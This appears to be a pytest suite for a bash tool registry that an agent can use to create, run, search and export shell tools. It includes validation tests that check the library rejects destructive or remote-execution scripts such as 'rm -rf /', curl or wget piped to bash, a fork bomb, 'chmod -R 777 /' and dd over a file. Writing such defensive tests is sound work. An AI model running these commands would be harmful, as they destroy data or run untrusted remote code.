"""Tests for Tool Registry."""

import json
import os
import pytest
import tempfile
import shutil
from pathlib import Path

from bashkuto import BashRuntime, SecurityError, ToolRegistry
from bashkuto.runtime.guards import BLOCKED_PATTERNS


@pytest.fixture
def temp_tool_dir():
    """Create a temporary directory for tools."""
    temp_dir = tempfile.mkdtemp()
    yield temp_dir
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def tool_registry(temp_tool_dir):
    """Create a ToolRegistry instance with temp directory."""
    return ToolRegistry(tool_dir=temp_tool_dir)


class TestToolRegistryBasic:
    """Test basic ToolRegistry functionality."""

    def test_create_simple_tool(self, tool_registry):
        """Should create a simple tool."""
        script = 'echo "Hello, $1!"'
        path = tool_registry.create_tool(
            name="greet",
            script=script,
            description="Greet someone"
        )
        
        assert path.exists()
        assert path.name == "greet.sh"
        assert script in path.read_text()

    def test_tool_is_executable(self, tool_registry):
        """Should make tool executable."""
        path = tool_registry.create_tool(
            name="test_tool",
            script="echo test"
        )
        
        if os.name != "nt":
            # Check executable bit on Unix
            assert os.access(path, os.X_OK)

    def test_tool_has_shebang(self, tool_registry):
        """Should add shebang if not present."""
        script = 'echo "no shebang"'
        path = tool_registry.create_tool(
            name="no_shebang",
            script=script
        )
        
        content = path.read_text()
        assert content.startswith("#!/bin/bash")

    def test_tool_preserves_shebang(self, tool_registry):
        """Should preserve existing shebang."""
        script = "#!/usr/bin/env bash\necho test"
        path = tool_registry.create_tool(
            name="with_shebang",
            script=script
        )
        
        content = path.read_text()
        assert content.startswith("#!/usr/bin/env bash")

    def test_tool_metadata_created(self, tool_registry):
        """Should create metadata JSON file."""
        tool_registry.create_tool(
            name="meta_tool",
            script="echo test",
            description="Test description",
            created_by="test_user"
        )
        
        metadata_path = tool_registry.tool_dir / "meta_tool.json"
        assert metadata_path.exists()
        
        metadata = json.loads(metadata_path.read_text())
        assert metadata["name"] == "meta_tool"
        assert metadata["description"] == "Test description"
        assert metadata["created_by"] == "test_user"
        assert "created_at" in metadata
        assert metadata["usage_count"] == 0

    def test_tool_directory_auto_created(self, temp_tool_dir):
        """Should auto-create tool directory."""
        nested_dir = os.path.join(temp_tool_dir, "subdir", "tools")
        registry = ToolRegistry(tool_dir=nested_dir)
        
        assert Path(nested_dir).exists()


class TestToolRegistryValidation:
    """Test script validation in ToolRegistry."""

    def test_blocks_rm_rf_root(self, tool_registry):
        """Should block rm -rf /."""
        with pytest.raises(SecurityError) as exc_info:
            tool_registry.create_tool(
                name="dangerous",
                script="rm -rf /"
            )
        assert "blocked pattern" in str(exc_info.value).lower()

    def test_blocks_rm_rf_home(self, tool_registry):
        """Should block rm -rf /home."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="rm -rf /home"
            )

    def test_blocks_rm_rf_etc(self, tool_registry):
        """Should block rm -rf /etc."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="rm -rf /etc"
            )

    def test_blocks_shutdown(self, tool_registry):
        """Should block shutdown command."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="shutdown -h now"
            )

    def test_blocks_reboot(self, tool_registry):
        """Should block reboot command."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="reboot -f"
            )

    def test_blocks_curl_pipe_bash(self, tool_registry):
        """Should block curl pipe to bash."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="curl http://example.com/script.sh | bash"
            )

    def test_blocks_wget_pipe_bash(self, tool_registry):
        """Should block wget pipe to bash."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="wget http://example.com/script.sh -O- | sh"
            )

    def test_blocks_fork_bomb(self, tool_registry):
        """Should block fork bomb."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script=":(){ :|:& };:"
            )

    def test_blocks_chmod_777_root(self, tool_registry):
        """Should block chmod 777 /."""
        with pytest.raises(SecurityError):
            tool_registry.create_tool(
                name="dangerous",
                script="chmod -R 777 /"
            )

    def test_allows_safe_script(self, tool_registry):
        """Should allow safe scripts."""
        script = """
grep ERROR "$1" | sort | uniq -c | sort -nr | head -20
"""
        path = tool_registry.create_tool(
            name="summarize_logs",
            script=script
        )
        assert path.exists()

    def test_custom_blocked_pattern(self, temp_tool_dir):
        """Should respect custom blocked patterns."""
        registry = ToolRegistry(
            tool_dir=temp_tool_dir,
            blocked_patterns=[r"my_custom_dangerous_cmd"]
        )
        
        with pytest.raises(SecurityError):
            registry.create_tool(
                name="custom_dangerous",
                script="my_custom_dangerous_cmd arg1"
            )

    def test_allowlist_mode(self, temp_tool_dir):
        """Should respect tool allowlist."""
        registry = ToolRegistry(
            tool_dir=temp_tool_dir,
            tool_allowlist=["grep", "sort", "uniq", "head", "tail"]
        )
        
        # Allowed command
        registry.create_tool(
            name="safe_tool",
            script="grep ERROR logs.txt"
        )
        
        # Not in allowlist
        with pytest.raises(SecurityError) as exc_info:
            registry.create_tool(
                name="unsafe_tool",
                script="rm file.txt"
            )
        assert "allowlist" in str(exc_info.value).lower()


class TestToolRegistryCRUD:
    """Test tool CRUD operations."""

    def test_tool_exists(self, tool_registry):
        """Should check if tool exists."""
        tool_registry.create_tool(name="test", script="echo test")
        
        assert tool_registry.tool_exists("test") is True
        assert tool_registry.tool_exists("nonexistent") is False

    def test_get_tool_path(self, tool_registry):
        """Should get tool path."""
        path = tool_registry.create_tool(name="test", script="echo test")
        
        retrieved_path = tool_registry.get_tool_path("test")
        assert retrieved_path == path
        
        assert tool_registry.get_tool_path("nonexistent") is None

    def test_get_script(self, tool_registry):
        """Should get script content."""
        script = 'echo "Hello"'
        tool_registry.create_tool(name="test", script=script)
        
        retrieved = tool_registry.get_script("test")
        assert script in retrieved
        
        assert tool_registry.get_script("nonexistent") is None

    def test_delete_tool(self, tool_registry):
        """Should delete tool."""
        tool_registry.create_tool(name="test", script="echo test")
        assert tool_registry.tool_exists("test")
        
        result = tool_registry.delete_tool("test")
        assert result is True
        assert tool_registry.tool_exists("test") is False

    def test_delete_nonexistent_tool(self, tool_registry):
        """Should return False for nonexistent tool."""
        result = tool_registry.delete_tool("nonexistent")
        assert result is False

    def test_list_tools(self, tool_registry):
        """Should list all tools."""
        tool_registry.create_tool(name="tool1", script="echo 1")
        tool_registry.create_tool(name="tool2", script="echo 2")
        tool_registry.create_tool(name="tool3", script="echo 3")
        
        tools = tool_registry.list_tools()
        assert sorted(tools) == ["tool1", "tool2", "tool3"]

    def test_list_tools_empty(self, tool_registry):
        """Should return empty list when no tools."""
        tools = tool_registry.list_tools()
        assert tools == []

    def test_describe_tool(self, tool_registry):
        """Should describe tool with metadata."""
        tool_registry.create_tool(
            name="test",
            script="echo test",
            description="Test tool"
        )
        
        desc = tool_registry.describe_tool("test")
        assert desc is not None
        assert desc["name"] == "test"
        assert desc["description"] == "Test tool"
        assert "echo test" in desc["script"]

    def test_describe_nonexistent_tool(self, tool_registry):
        """Should return None for nonexistent tool."""
        desc = tool_registry.describe_tool("nonexistent")
        assert desc is None

    def test_search_tools_by_name(self, tool_registry):
        """Should search tools by name."""
        tool_registry.create_tool(
            name="log_analyzer",
            script="grep ERROR",
            description="Analyze logs"
        )
        
        results = tool_registry.search_tools("log")
        assert "log_analyzer" in results

    def test_search_tools_by_description(self, tool_registry):
        """Should search tools by description."""
        tool_registry.create_tool(
            name="analyzer",
            script="grep ERROR",
            description="Error analysis tool"
        )
        
        results = tool_registry.search_tools("error")
        assert "analyzer" in results

    def test_search_tools_no_results(self, tool_registry):
        """Should return empty list for no matches."""
        tool_registry.create_tool(
            name="test",
            script="echo test",
            description="Test tool"
        )
        
        results = tool_registry.search_tools("nonexistent")
        assert results == []


class TestToolRegistryUsage:
    """Test usage tracking."""

    def test_increment_usage(self, tool_registry):
        """Should increment usage count."""
        tool_registry.create_tool(name="test", script="echo test")
        
        tool_registry.increment_usage("test")
        
        desc = tool_registry.describe_tool("test")
        assert desc["usage_count"] == 1
        assert desc["last_used"] is not None

    def test_increment_usage_multiple_times(self, tool_registry):
        """Should increment multiple times."""
        tool_registry.create_tool(name="test", script="echo test")
        
        tool_registry.increment_usage("test")
        tool_registry.increment_usage("test")
        tool_registry.increment_usage("test")
        
        desc = tool_registry.describe_tool("test")
        assert desc["usage_count"] == 3

    def test_increment_usage_nonexistent(self, tool_registry):
        """Should not fail for nonexistent tool."""
        tool_registry.increment_usage("nonexistent")  # Should not raise


class TestToolRegistryImportExport:
    """Test import/export functionality."""

    def test_export_tools(self, tool_registry, temp_tool_dir):
        """Should export tools to JSON."""
        tool_registry.create_tool(
            name="tool1",
            script="echo 1",
            description="First tool"
        )
        tool_registry.create_tool(
            name="tool2",
            script="echo 2",
            description="Second tool"
        )
        
        export_path = os.path.join(temp_tool_dir, "export.json")
        count = tool_registry.export_tools(export_path)
        
        assert count == 2
        assert Path(export_path).exists()
        
        data = json.loads(Path(export_path).read_text())
        assert "tool1" in data
        assert "tool2" in data

    def test_import_tools(self, tool_registry, temp_tool_dir):
        """Should import tools from JSON."""
        # Create export file
        tool_registry.create_tool(
            name="tool1",
            script="echo 1",
            description="First tool"
        )
        export_path = os.path.join(temp_tool_dir, "export.json")
        tool_registry.export_tools(export_path)
        
        # Create new registry
        new_registry = ToolRegistry(
            tool_dir=tempfile.mkdtemp()
        )
        
        try:
            count = new_registry.import_tools(export_path)
            assert count == 1
            assert new_registry.tool_exists("tool1")
        finally:
            shutil.rmtree(new_registry.tool_dir, ignore_errors=True)

    def test_import_tools_overwrite(self, tool_registry, temp_tool_dir):
        """Should respect overwrite flag."""
        # Create initial tool
        tool_registry.create_tool(
            name="tool1",
            script="echo original",
            description="Original"
        )
        
        # Create export with different script
        temp_dir2 = tempfile.mkdtemp()
        try:
            registry2 = ToolRegistry(tool_dir=temp_dir2)
            registry2.create_tool(
                name="tool1",
                script="echo modified",
                description="Modified"
            )
            export_path = os.path.join(temp_dir2, "export.json")
            registry2.export_tools(export_path)
            
            # Import without overwrite (should skip)
            count = tool_registry.import_tools(export_path, overwrite=False)
            assert count == 0
            
            # Import with overwrite
            count = tool_registry.import_tools(export_path, overwrite=True)
            assert count == 1
            
            desc = tool_registry.describe_tool("tool1")
            assert "echo modified" in desc["script"]
        finally:
            shutil.rmtree(temp_dir2, ignore_errors=True)

    def test_import_tools_file_not_found(self, tool_registry):
        """Should raise FileNotFoundError."""
        with pytest.raises(FileNotFoundError):
            tool_registry.import_tools("/nonexistent/path.json")


class TestToolRegistryClear:
    """Test clear functionality."""

    def test_clear_all_tools(self, tool_registry):
        """Should clear all tools."""
        tool_registry.create_tool(name="tool1", script="echo 1")
        tool_registry.create_tool(name="tool2", script="echo 2")
        tool_registry.create_tool(name="tool3", script="echo 3")
        
        count = tool_registry.clear_all_tools()
        assert count == 3
        assert tool_registry.list_tools() == []

    def test_clear_empty_registry(self, tool_registry):
        """Should handle empty registry."""
        count = tool_registry.clear_all_tools()
        assert count == 0


class TestToolRegistryInvalidNames:
    """Test invalid tool name handling."""

    def test_empty_name(self, tool_registry):
        """Should reject empty name."""
        with pytest.raises(ValueError) as exc_info:
            tool_registry.create_tool(name="", script="echo test")
        assert "empty" in str(exc_info.value).lower()

    def test_name_starts_with_number(self, tool_registry):
        """Should reject name starting with number."""
        with pytest.raises(ValueError):
            tool_registry.create_tool(name="123tool", script="echo test")

    def test_name_with_special_chars(self, tool_registry):
        """Should reject name with special characters."""
        with pytest.raises(ValueError):
            tool_registry.create_tool(name="tool@name", script="echo test")

    def test_valid_names(self, tool_registry):
        """Should accept valid names."""
        valid_names = ["tool", "my_tool", "my-tool", "tool123", "Tool"]
        
        for name in valid_names:
            path = tool_registry.create_tool(name=name, script="echo test")
            assert path.exists()


class TestBashRuntimeWithTools:
    """Test BashRuntime integration with tools."""

    def test_create_tool_via_runtime(self, temp_tool_dir):
        """Should create tool via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        path = runtime.create_tool(
            name="greet",
            script='echo "Hello, $1!"',
            description="Greet someone"
        )
        
        assert path.exists()

    def test_execute_tool_via_runtime(self, temp_tool_dir):
        """Should execute tool via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        # Create tool
        runtime.create_tool(
            name="greet",
            script='echo "Hello, $1!"'
        )
        
        # Execute tool
        result = runtime.run("greet Alice")
        assert result.success is True
        assert "Hello, Alice!" in result.output

    def test_execute_tool_with_multiple_args(self, temp_tool_dir):
        """Should execute tool with multiple args."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(
            name="concat",
            script='echo "$1 $2 $3"'
        )
        
        result = runtime.run("concat hello world test")
        assert result.success is True
        assert "hello world test" in result.output

    def test_tool_takes_precedence_over_shell(self, temp_tool_dir):
        """Should execute tool instead of shell command."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        # Create tool named 'echo'
        runtime.create_tool(
            name="echo",
            script='echo "TOOL: $*"'
        )
        
        result = runtime.run("echo hello")
        assert "TOOL: hello" in result.output

    def test_shell_fallback_when_no_tool(self, temp_tool_dir):
        """Should fall back to shell when no tool."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        result = runtime.run("echo hello")
        assert "hello" in result.output

    def test_list_tools_via_runtime(self, temp_tool_dir):
        """Should list tools via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(name="tool1", script="echo 1")
        runtime.create_tool(name="tool2", script="echo 2")
        
        tools = runtime.list_tools()
        assert sorted(tools) == ["tool1", "tool2"]

    def test_describe_tool_via_runtime(self, temp_tool_dir):
        """Should describe tool via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(
            name="test",
            script="echo test",
            description="Test tool"
        )
        
        desc = runtime.describe_tool("test")
        assert desc is not None
        assert desc["description"] == "Test tool"

    def test_delete_tool_via_runtime(self, temp_tool_dir):
        """Should delete tool via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(name="test", script="echo test")
        assert runtime.tool_exists("test")
        
        runtime.delete_tool("test")
        assert not runtime.tool_exists("test")

    def test_search_tools_via_runtime(self, temp_tool_dir):
        """Should search tools via runtime."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(
            name="log_analyzer",
            script="grep ERROR",
            description="Analyze logs"
        )
        
        results = runtime.search_tools("log")
        assert "log_analyzer" in results

    def test_tool_usage_tracked(self, temp_tool_dir):
        """Should track tool usage."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        runtime.create_tool(name="test", script="echo test")
        
        # Execute tool
        runtime.run("test")
        
        desc = runtime.describe_tool("test")
        assert desc["usage_count"] == 1

    def test_dangerous_tool_blocked(self, temp_tool_dir):
        """Should block dangerous tool creation."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)
        
        with pytest.raises(SecurityError):
            runtime.create_tool(
                name="dangerous",
                script="rm -rf /"
            )

    def test_custom_tool_blocked_patterns(self, temp_tool_dir):
        """Should respect custom blocked patterns."""
        runtime = BashRuntime(
            tool_dir=temp_tool_dir,
            tool_blocked_patterns=[r"forbidden_cmd"]
        )
        
        with pytest.raises(SecurityError):
            runtime.create_tool(
                name="forbidden",
                script="forbidden_cmd arg"
            )

    def test_tool_allowlist_in_runtime(self, temp_tool_dir):
        """Should respect tool allowlist in runtime."""
        runtime = BashRuntime(
            tool_dir=temp_tool_dir,
            tool_allowlist=["echo", "grep", "cat"]
        )

        # Allowed
        runtime.create_tool(name="safe", script="echo hello")

        # Not allowed
        with pytest.raises(SecurityError):
            runtime.create_tool(name="unsafe", script="rm file")


class TestToolExecutionSecurity:
    """Test tool execution security validation."""

    def test_tool_invocation_blocked_by_default(self, temp_tool_dir):
        """Should block tool invocation with dangerous arguments by default."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # Create a safe tool (without dangerous command patterns)
        runtime.create_tool(
            name="echo_wrapper",
            script='echo "$1"'
        )

        # But invoking with dangerous command should be blocked
        with pytest.raises(SecurityError):
            runtime.run("echo_wrapper 'rm -rf /home'")

    def test_tool_invocation_with_rm_rf_blocked(self, temp_tool_dir):
        """Should block tool invocation with rm -rf arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # Create a generic wrapper tool
        runtime.create_tool(
            name="exec",
            script='exec "$@"'
        )

        # Invoking with dangerous command should be blocked
        with pytest.raises(SecurityError):
            runtime.run("exec rm -rf /tmp")

    def test_tool_execution_security_disabled(self, temp_tool_dir):
        """Should allow unrestricted tool execution when security disabled."""
        runtime = BashRuntime(
            tool_dir=temp_tool_dir,
            tool_execution_security=False
        )

        # Create a tool with variable arguments
        runtime.create_tool(
            name="runner",
            script='bash -c "$1"'
        )

        # Should execute without security check (not recommended!)
        # Note: This may still fail depending on the actual command
        # We're testing that the security check is skipped, not that it succeeds
        try:
            result = runtime.run("runner 'echo hello'")
            # If it runs, security was disabled
            assert result is not None
        except SecurityError:
            # If it fails, it should be for a different reason (not security)
            pytest.fail("SecurityError raised when tool_execution_security=False")

    def test_safe_tool_invocation_allowed(self, temp_tool_dir):
        """Should allow safe tool invocations."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # Create a safe tool
        runtime.create_tool(
            name="greet",
            script='echo "Hello, $1!"'
        )

        # Safe invocation should work
        result = runtime.run("greet Alice")
        assert result.success is True
        assert "Hello, Alice!" in result.output

    def test_tool_invocation_with_safe_file_operation(self, temp_tool_dir):
        """Should allow tool invocation with safe file operations."""
        import os
        
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # Create a simple echo tool instead (avoids Windows path issues)
        runtime.create_tool(
            name="echo_args",
            script='echo "Args: $@"'
        )

        # Safe invocation should work
        result = runtime.run("echo_args hello world")
        assert result.success is True
        assert "Args: hello world" in result.output


class TestDangerousArgumentPatterns:
    """Test validation of dangerous argument patterns in tool scripts."""

    def test_blocks_rm_with_variable_args(self, temp_tool_dir):
        """Should block rm with variable arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        with pytest.raises(SecurityError) as exc_info:
            runtime.create_tool(
                name="cleanup",
                script='rm "$@"'
            )
        assert "dangerous command" in str(exc_info.value).lower()

    def test_blocks_rm_with_positional_args(self, temp_tool_dir):
        """Should block rm with positional parameter arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        with pytest.raises(SecurityError):
            runtime.create_tool(
                name="cleanup",
                script='rm $1'
            )

    def test_blocks_chmod_with_variable_args(self, temp_tool_dir):
        """Should block chmod with variable arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        with pytest.raises(SecurityError):
            runtime.create_tool(
                name="permissions",
                script='chmod 777 "$1"'
            )

    def test_blocks_dd_with_variable_args(self, temp_tool_dir):
        """Should block dd with variable arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        with pytest.raises(SecurityError):
            runtime.create_tool(
                name="disk_write",
                script='dd if=/dev/zero of="$1"'
            )

    def test_allows_safe_variable_usage(self, temp_tool_dir):
        """Should allow safe commands with variable arguments."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # grep with $1 should be allowed (grep is not in dangerous list)
        path = runtime.create_tool(
            name="search",
            script='grep "$1" "$2"'
        )
        assert path.exists()

    def test_allows_explicit_argument_validation(self, temp_tool_dir):
        """Should allow tools that validate arguments explicitly."""
        runtime = BashRuntime(tool_dir=temp_tool_dir)

        # This pattern is safer because it uses the variable in a safe context
        # Using grep instead of rm since rm with $1 is blocked
        path = runtime.create_tool(
            name="safe_search",
            script='''
# Only search in specific safe directories
if [ "$2" = "/tmp" ] || [ -z "$2" ]; then
    grep "$1" "$2" 2>/dev/null || true
else
    echo "Error: Only /tmp or current directory is allowed"
    exit 1
fi
'''
        )
        assert path.exists()
